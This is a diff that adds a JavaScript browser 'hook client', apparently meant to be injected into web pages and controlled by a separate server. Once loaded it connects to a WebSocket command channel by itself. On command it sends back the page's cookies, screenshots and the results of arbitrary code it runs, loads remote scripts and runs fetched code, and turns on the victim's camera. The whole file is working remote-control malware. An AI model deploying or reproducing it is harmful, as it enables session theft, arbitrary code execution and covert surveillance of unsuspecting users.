@@ -1,0 +1,424 @@
+// hook-client.js
+// Robust WebSocket hook client that works with the hook_server_injecting.py server.
+// Features:
+//  - auto-registers with server
+//  - heartbeat + reconnect
+//  - commands: take_screenshot, get_title, get_cookies, eval, evalfile, open_camera, stop_camera, beep, ping
+//  - screenshot uses html2canvas (make sure it's included on the page)
+//  - safe eval via Function wrapper; supports async results
+//  - loads remote scripts via <script> tag for evalfile/scriptUrl
+//  - returns responses/errors to server in JSON
+
+(function () {
+  // ---------- Configuration ----------
+  // SERVER_HOST and SERVER_PORT and CLIENT_PATH are normally injected by the server.
+  const DEFAULT_PATH = '/hook';
+  const SERVER_HOST_VAL = (typeof SERVER_HOST !== 'undefined') ? SERVER_HOST : (location.hostname || 'localhost');
+  const SERVER_PORT_VAL = (typeof SERVER_PORT !== 'undefined') ? String(SERVER_PORT || '') : '';
+  const CLIENT_PATH_VAL = (typeof CLIENT_PATH !== 'undefined') ? CLIENT_PATH : DEFAULT_PATH;
+
+  // browser id
+  const browserId = (typeof window.__hookClientId !== 'undefined') ? window.__hookClientId : ('browser_' + Math.random().toString(36).slice(2,9));
+  window.__hookClientId = browserId;
+
+  // internal state
+  let ws = null;
+  let reconnectAttempts = 0;
+  let reconnectTimer = null;
+  let heartbeatTimer = null;
+  let cameraStream = null;
+
+  // ---------- Helpers ----------
+  function safeJsonParse(s) {
+    try { return JSON.parse(s); } catch (e) { return null; }
+  }
+
+  function log(...args) { console.debug('[hook-client]', ...args); }
+
+  function makeWsUrl() {
+    // Prefer server-provided wsUrl() if it exists
+    if (typeof wsUrl === 'function') {
+      try {
+        return wsUrl();
+      } catch (e) {
+        log('wsUrl() function threw, falling back');
+      }
+    }
+    const protocol = (location.protocol === 'https:') ? 'wss' : 'ws';
+    const host = SERVER_HOST_VAL || location.hostname;
+    const port = SERVER_PORT_VAL ? (':' + SERVER_PORT_VAL) : '';
+    const path = (CLIENT_PATH_VAL && CLIENT_PATH_VAL.startsWith('/')) ? CLIENT_PATH_VAL : ('/' + (CLIENT_PATH_VAL || DEFAULT_PATH));
+    return `${protocol}://${host}${port}${path}`;
+  }
+
+  function sendJson(obj) {
+    if (!ws || ws.readyState !== WebSocket.OPEN) {
+      log('socket not open, cannot send', obj);
+      return false;
+    }
+    try {
+      ws.send(JSON.stringify(obj));
+      return true;
+    } catch (err) {
+      console.error('send failed', err);
+      return false;
+    }
+  }
+
+  async function loadScriptUrl(url, timeoutMs = 15000) {
+    return new Promise((resolve, reject) => {
+      let done = false;
+      const s = document.createElement('script');
+      s.src = url;
+      s.async = true;
+      s.onload = () => { if (!done) { done = true; resolve({ok:true, url}); } };
+      s.onerror = (e) => { if (!done) { done = true; reject(new Error('Failed to load script: ' + url)); } };
+      document.head.appendChild(s);
+      // optional timeout
+      setTimeout(() => { if (!done) { done = true; reject(new Error('Loading script timed out: ' + url)); } }, timeoutMs);
+    });
+  }
+
+  async function fetchText(url, timeoutMs = 10000) {
+    const controller = new AbortController();
+    const id = setTimeout(() => controller.abort(), timeoutMs);
+    try {
+      const res = await fetch(url, { signal: controller.signal });
+      clearTimeout(id);
+      if (!res.ok) throw new Error(`fetch failed: ${res.status}`);
+      return await res.text();
+    } finally {
+      clearTimeout(id);
+    }
+  }
+
+  // ---------- Command handlers ----------
+  async function handleTakeScreenshot(command) {
+    try {
+      if (typeof html2canvas !== 'function') throw new Error('html2canvas not available');
+      const canvas = await html2canvas(document.body);
+      const dataUrl = canvas.toDataURL('image/png');
+      sendJson({
+        type: 'response',
+        subtype: 'screenshot',
+        data: dataUrl,
+        browserId,
+        url: location.href,
+        commandId: command.commandId || null,
+        ts: new Date().toISOString()
+      });
+      log('screenshot sent');
+    } catch (err) {
+      sendJson({
+        type: 'error',
+        data: String(err && err.message ? err.message : err),
+        browserId,
+        commandId: command.commandId || null,
+        ts: new Date().toISOString()
+      });
+      log('screenshot failed', err);
+    }
+  }
+
+  function handleGetTitle(command) {
+    try {
+      sendJson({
+        type: 'response',
+        subtype: 'title',
+        data: document.title,
+        browserId,
+        url: location.href,
+        commandId: command.commandId || null,
+        ts: new Date().toISOString()
+      });
+    } catch (err) {
+      sendJson({ type: 'error', data: String(err), browserId, commandId: command.commandId || null });
+    }
+  }
+
+  function handleGetCookies(command) {
+    try {
+      sendJson({
+        type: 'response',
+        subtype: 'cookies',
+        data: document.cookie,
+        browserId,
+        url: location.href,
+        commandId: command.commandId || null,
+        ts: new Date().toISOString()
+      });
+    } catch (err) {
+      sendJson({ type: 'error', data: String(err), browserId, commandId: command.commandId || null });
+    }
+  }
+
+  async function handleEval(command) {
+    try {
+      if (!command.code) throw new Error('No code provided');
+      // run in Function wrapper to avoid accessing page scope accidentally
+      const fn = new Function('"use strict";\n' + (command.code || ''));
+      let result = fn();
+      if (result instanceof Promise) result = await result;
+      // Try to send result (serialize safely)
+      let payload = result;
+      try { payload = (typeof result === 'undefined' ? null : result); } catch(e){}
+      sendJson({
+        type: 'response',
+        subtype: 'eval',
+        data: payload,
+        browserId,
+        url: location.href,
+        commandId: command.commandId || null,
+        ts: new Date().toISOString()
+      });
+    } catch (err) {
+      sendJson({
+        type: 'error',
+        data: String(err && err.message ? err.message : err),
+        browserId,
+        commandId: command.commandId || null,
+        ts: new Date().toISOString()
+      });
+    }
+  }
+
+  async function handleEvalFile(command) {
+    // Accepts: command.code  OR command.scriptUrl OR command.fileUrl
+    try {
+      if (command.code) {
+        await handleEval(command);
+        return;
+      }
+      if (command.scriptUrl) {
+        await loadScriptUrl(command.scriptUrl);
+        sendJson({ type: 'response', subtype: 'eval', data: `loaded ${command.scriptUrl}`, browserId, commandId: command.commandId || null, ts: new Date().toISOString() });
+        return;
+      }
+      if (command.fileUrl) {
+        const text = await fetchText(command.fileUrl);
+        // run fetched code
+        const fn = new Function('"use strict";\n' + text);
+        let result = fn();
+        if (result instanceof Promise) result = await result;
+        sendJson({ type: 'response', subtype: 'eval', data: (result === undefined ? null : result), browserId, commandId: command.commandId || null, ts: new Date().toISOString() });
+        return;
+      }
+      throw new Error('evalfile requires code, scriptUrl or fileUrl');
+    } catch (err) {
+      sendJson({ type: 'error', data: String(err && err.message ? err.message : err), browserId, commandId: command.commandId || null });
+    }
+  }
+
+  async function handleOpenCamera(command) {
+    try {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        throw new Error('getUserMedia not supported');
+      }
+      const constraints = command.constraints || { video: true, audio: false };
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      // attach to a small floating video element
+      let v = document.getElementById('__hook_client_camera');
+      if (!v) {
+        v = document.createElement('video');
+        v.id = '__hook_client_camera';
+        v.autoplay = true;
+        v.playsInline = true;
+        v.style.position = 'fixed';
+        v.style.right = '10px';
+        v.style.bottom = '10px';
+        v.style.width = '220px';
+        v.style.zIndex = 999999;
+        v.style.border = '2px solid rgba(255,255,255,0.9)';
+        document.body.appendChild(v);
+      }
+      v.srcObject = stream;
+      cameraStream = stream;
+      sendJson({ type: 'response', subtype: 'camera', data: 'started', browserId, commandId: command.commandId || null, ts: new Date().toISOString() });
+    } catch (err) {
+      sendJson({ type: 'error', data: String(err && err.message ? err.message : err), browserId, commandId: command.commandId || null });
+    }
+  }
+
+  function handleStopCamera(command) {
+    try {
+      if (cameraStream) {
+        cameraStream.getTracks().forEach(t => t.stop());
+        cameraStream = null;
+      }
+      const v = document.getElementById('__hook_client_camera');
+      if (v) {
+        v.srcObject = null;
+        try { v.remove(); } catch (e) {}
+      }
+      sendJson({ type: 'response', subtype: 'camera', data: 'stopped', browserId, commandId: command.commandId || null, ts: new Date().toISOString() });
+    } catch (err) {
+      sendJson({ type: 'error', data: String(err), browserId, commandId: command.commandId || null });
+    }
+  }
+
+  function handleBeep(command) {
+    try {
+      const duration = (command.duration != null) ? Number(command.duration) : 200;
+      const frequency = (command.frequency != null) ? Number(command.frequency) : 440;
+      const volume = (command.volume != null) ? Number(command.volume) : 0.5;
+      const AudioCtx = window.AudioContext || window.webkitAudioContext;
+      if (!AudioCtx) throw new Error('Web Audio API not supported');
+      const ctx = new AudioCtx();
+      const osc = ctx.createOscillator();
+      const gain = ctx.createGain();
+      osc.type = command.wave || 'sine';
+      osc.frequency.value = frequency;
+      gain.gain.value = volume;
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      const now = ctx.currentTime;
+      osc.start(now);
+      osc.stop(now + duration / 1000);
+      // close context after a little delay where supported
+      setTimeout(() => { try { ctx.close(); } catch(e){} }, duration + 50);
+      sendJson({ type: 'response', subtype: 'beep', data: 'played', browserId, commandId: command.commandId || null, ts: new Date().toISOString() });
+    } catch (err) {
+      sendJson({ type: 'error', data: String(err), browserId, commandId: command.commandId || null });
+    }
+  }
+
+  // Generic command dispatcher
+  async function handleServerCommand(command) {
+    if (!command || !command.type) {
+      log('unknown server payload', command);
+      return;
+    }
+    switch (command.type) {
+      case 'take_screenshot':
+        return await handleTakeScreenshot(command);
+      case 'get_title':
+      case 'get_page_title':
+        return handleGetTitle(command);
+      case 'get_cookies':
+        return handleGetCookies(command);
+      case 'eval':
+        return await handleEval(command);
+      case 'evalfile':
+        return await handleEvalFile(command);
+      case 'open_camera':
+      case 'start_camera':
+        return await handleOpenCamera(command);
+      case 'stop_camera':
+        return handleStopCamera(command);
+      case 'beep':
+        return handleBeep(command);
+      case 'ping':
+        return sendJson({ type: 'pong', ts: Date.now(), browserId, commandId: command.commandId || null });
+      default:
+        // fallback: echo the command back
+        sendJson({ type: 'response', subtype: 'unknown', data: command, browserId, commandId: command.commandId || null });
+    }
+  }
+
+  // ---------- Connection lifecycle ----------
+  function startHeartbeat() {
+    stopHeartbeat();
+    heartbeatTimer = setInterval(() => {
+      if (ws && ws.readyState === WebSocket.OPEN) {
+        sendJson({ type: 'ping', ts: Date.now(), browserId });
+      }
+    }, 20000);
+  }
+  function stopHeartbeat() {
+    if (heartbeatTimer) { clearInterval(heartbeatTimer); heartbeatTimer = null; }
+  }
+
+  function scheduleReconnect() {
+    reconnectAttempts++;
+    const delay = Math.min(60000, Math.pow(2, Math.min(reconnectAttempts, 8)) * 1000) + Math.floor(Math.random()*1000);
+    log('reconnect in ms', delay);
+    if (reconnectTimer) clearTimeout(reconnectTimer);
+    reconnectTimer = setTimeout(() => {
+      connect();
+    }, delay);
+  }
+
+  function connect() {
+    if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) {
+      log('already connected or connecting');
+      return;
+    }
+    const url = makeWsUrl();
+    log('connecting to', url);
+    try {
+      ws = new WebSocket(url);
+    } catch (err) {
+      log('WebSocket constructor error', err);
+      scheduleReconnect();
+      return;
+    }
+
+    ws.onopen = () => {
+      reconnectAttempts = 0;
+      log('connected, sending register');
+      sendJson({
+        type: 'register',
+        browserId,
+        userAgent: navigator.userAgent,
+        url: location.href,
+        path: CLIENT_PATH_VAL,
+        ts: new Date().toISOString()
+      });
+      startHeartbeat();
+    };
+
+    ws.onmessage = async (evt) => {
+      const payload = safeJsonParse(evt.data);
+      if (!payload) {
+        log('raw message', evt.data);
+        return;
+      }
+      if (payload.type === 'registered') {
+        log('server registered id=', payload.browserId);
+        // server assigned id might be authoritative; store it
+        if (payload.browserId && payload.browserId !== browserId) {
+          window.__hookClientId = payload.browserId;
+        }
+        return;
+      }
+      // handle command
+      await handleServerCommand(payload);
+    };
+
+    ws.onerror = (ev) => {
+      console.warn('WS error', ev);
+    };
+
+    ws.onclose = (ev) => {
+      log('socket closed', ev && ev.code, ev && ev.reason);
+      stopHeartbeat();
+      scheduleReconnect();
+    };
+  }
+
+  function disconnect() {
+    stopHeartbeat();
+    if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }
+    if (ws) {
+      try { ws.close(); } catch (e) {}
+      ws = null;
+    }
+  }
+
+  // ---------- Public API ----------
+  window.__hookClient = {
+    connect,
+    disconnect,
+    sendJson,
+    getBrowserId: () => window.__hookClientId,
+    openCamera: async (constraints) => { await handleOpenCamera({ commandId: 'manual_open', constraints }); },
+    stopCamera: () => { handleStopCamera({ commandId: 'manual_stop' }); },
+    beep: (opts) => { handleBeep(Object.assign({}, opts, { commandId: 'manual_beep' })); },
+  };
+
+  // auto-connect after a short delay to allow page to settle
+  setTimeout(() => {
+    try { connect(); } catch (e) { log('connect failed', e); }
+  }, 200);
+
+})();
